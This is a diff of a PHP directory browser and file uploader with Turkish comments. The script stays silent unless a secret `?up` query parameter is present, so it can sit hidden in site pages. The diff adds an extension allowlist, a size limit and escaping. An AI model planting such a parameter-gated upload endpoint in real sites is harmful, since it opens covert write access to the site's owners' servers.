@@ -5,8 +5,7 @@ $current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;
 
 // Eğer ?up parametresi yoksa, sayfanın geri kalan kısmını etkilemeden çık
 if (!isset($_GET['up'])) {
-    // HTML içeriğini etkilemek istemiyorsanız, bu kısmı burada bırakıyoruz
-    return; // veya die(); kullanabilirsiniz
+    return; // sayfayı durduruyoruz
 }
 
 // Güvenlik: Yalnızca belirtilen dizinin altında gezinebilmek için kontrol
@@ -16,9 +15,26 @@ if (strpos($current_dir, realpath($root)) !== 0) {
 
 // Dosya yükleme işlemi
 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
-    $target_file = $current_dir . '/' . basename($_FILES['file']['name']);
+    // Yüklenebilecek dosya uzantılarını belirleyelim
+    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx', 'zip', 'txt', 'mp4', 'mp3', 'csv', 'xls', 'xlsx'];
+    
+    $file_name = basename($_FILES['file']['name']);
+    $file_extension = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
+    $target_file = $current_dir . '/' . $file_name;
+
+    // Dosya uzantısının izin verilenler arasında olup olmadığını kontrol edelim
+    if (!in_array($file_extension, $allowed_extensions)) {
+        die('Yüklemek istediğiniz dosya uzantısı izin verilenler arasında değil!');
+    }
+
+    // Dosya boyutunu kontrol et
+    if ($_FILES['file']['size'] > 5 * 1024 * 1024) { // 5MB limit
+        die('Dosya boyutu 5MB\'dan büyük olamaz!');
+    }
+
+    // Yükleme işlemini gerçekleştir
     if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
-        echo 'Dosya başarıyla yüklendi: ' . basename($_FILES['file']['name']);
+        echo 'Dosya başarıyla yüklendi: ' . htmlspecialchars($file_name);
     } else {
         echo 'Dosya yüklenemedi!';
     }
@@ -48,9 +64,6 @@ foreach ($files as $file) {
     }
 }
 
-// PHP dosyasının bulunduğu dizine gitmek için bir bağlantı ekliyoruz
-$navigation_links[] = '<a href="?dir=' . urlencode($root) . '&up=' . urlencode($_GET['up']) . '">Site Dizinine Git</a>';
-
 // Kullanıcıya dosyaları ve dizinleri gösterme
 echo "Mevcut Dizin: " . htmlspecialchars($current_dir) . "<br>";
 echo "<ul>";
@@ -62,7 +75,7 @@ echo "</ul>";
 // Dosya Yükleme Formu
 echo '<h2>Dosya Yükle</h2>';
 echo '<form action="" method="post" enctype="multipart/form-data">';
-echo '<input type="file" name="file">';
+echo '<input type="file" name="file" required>';
 echo '<input type="submit" value="Yükle">';
 echo '</form>';
 ?>
